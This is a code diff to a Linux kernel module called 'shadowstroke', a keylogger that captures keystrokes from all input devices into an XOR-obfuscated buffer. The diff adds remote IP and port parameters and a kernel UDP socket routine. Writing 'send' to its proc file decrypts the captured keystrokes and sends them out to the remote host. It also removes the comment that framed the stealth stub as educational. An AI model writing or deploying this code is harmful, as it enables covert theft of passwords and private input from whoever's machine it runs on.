@@ -7,6 +7,10 @@
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
 #include <linux/mutex.h>
+#include <linux/in.h>
+#include <linux/net.h>
+#include <net/sock.h>
+#include <linux/string.h>
 
 #define SHADOWSTROKE_BUF_SIZE 4096
 
@@ -25,6 +29,13 @@ static size_t buf_head = 0, buf_tail = 0;
 static char shadowstroke_xor_key = 0x5A; // default XOR key
 module_param(shadowstroke_xor_key, byte, 0600);
 MODULE_PARM_DESC(shadowstroke_xor_key, "XOR key for keystroke obfuscation");
+
+static char *remote_ip = NULL;
+static int remote_port = 0;
+module_param(remote_ip, charp, 0600);
+MODULE_PARM_DESC(remote_ip, "Remote IPv4 address for UDP exfiltration");
+module_param(remote_port, int, 0600);
+MODULE_PARM_DESC(remote_port, "Remote UDP port for exfiltration");
 
 static const char *keymap[256] = {
     [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d", [KEY_E] = "e",
@@ -63,7 +74,7 @@ static void shadowstroke_log_char(const char *c)
     size_t i;
     mutex_lock(&shadowstroke_buf_mutex);
     for (i = 0; i < len; ++i) {
-        keystroke_buf[buf_head] = c[i] ^ shadowstroke_xor_key; // Encrypt
+        keystroke_buf[buf_head] = c[i] ^ shadowstroke_xor_key;
         buf_head = (buf_head + 1) % SHADOWSTROKE_BUF_SIZE;
         if (buf_head == buf_tail) // buffer full, overwrite oldest
             buf_tail = (buf_tail + 1) % SHADOWSTROKE_BUF_SIZE;
@@ -77,7 +88,7 @@ static bool shadowstroke_should_log(void)
     return true;
 }
 
-// Stealth stub (for educational purposes)
+
 static void shadowstroke_hide_module(void)
 {
 
@@ -143,7 +154,7 @@ static void shadowstroke_disconnect(struct input_handle *handle)
 }
 
 static const struct input_device_id shadowstroke_ids[] = {
-    { .driver_info = 1 }, // Match all devices
+    { .driver_info = 1 },
     { },
 };
 
@@ -156,6 +167,42 @@ static struct input_handler shadowstroke_input_handler = {
     .name = "shadowstroke",
     .id_table = shadowstroke_ids,
 };
+
+static int shadowstroke_send_udp(const char *data, size_t len)
+{
+    struct socket *sock;
+    struct sockaddr_in addr;
+    int ret = 0;
+    mm_segment_t oldfs;
+
+    if (!remote_ip || remote_port == 0)
+        return -EINVAL;
+
+    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
+    if (ret < 0)
+        return ret;
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(remote_port);
+    addr.sin_addr.s_addr = in_aton(remote_ip);
+
+    oldfs = get_fs();
+    set_fs(KERNEL_DS);
+    ret = sock_sendmsg(sock, &(struct msghdr){
+        .msg_name = &addr,
+        .msg_namelen = sizeof(addr),
+        .msg_iov = &(struct kvec){ .iov_base = (void *)data, .iov_len = len },
+        .msg_iovlen = 1,
+        .msg_control = NULL,
+        .msg_controllen = 0,
+        .msg_flags = 0,
+    }, len);
+    set_fs(oldfs);
+
+    sock_release(sock);
+    return ret;
+}
 
 static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
@@ -185,9 +232,32 @@ static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_
 
 static ssize_t shadowstroke_proc_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
 {
-    mutex_lock(&shadowstroke_buf_mutex);
-    buf_head = buf_tail = 0;
-    mutex_unlock(&shadowstroke_buf_mutex);
+    char kbuf[16];
+    size_t to_copy = min(count, sizeof(kbuf) - 1);
+    if (copy_from_user(kbuf, buf, to_copy))
+        return -EFAULT;
+    kbuf[to_copy] = '\0';
+
+    if (strncmp(kbuf, "send", 4) == 0) {
+
+        char tmp[SHADOWSTROKE_BUF_SIZE];
+        size_t len = 0, i;
+        mutex_lock(&shadowstroke_buf_mutex);
+        i = buf_tail;
+        while (i != buf_head && len < SHADOWSTROKE_BUF_SIZE - 1) {
+            tmp[len++] = keystroke_buf[i] ^ shadowstroke_xor_key; // Decrypt for exfil
+            i = (i + 1) % SHADOWSTROKE_BUF_SIZE;
+        }
+        tmp[len] = '\0';
+        mutex_unlock(&shadowstroke_buf_mutex);
+        if (len > 0)
+            shadowstroke_send_udp(tmp, len);
+    } else {
+
+        mutex_lock(&shadowstroke_buf_mutex);
+        buf_head = buf_tail = 0;
+        mutex_unlock(&shadowstroke_buf_mutex);
+    }
     return count;
 }
 
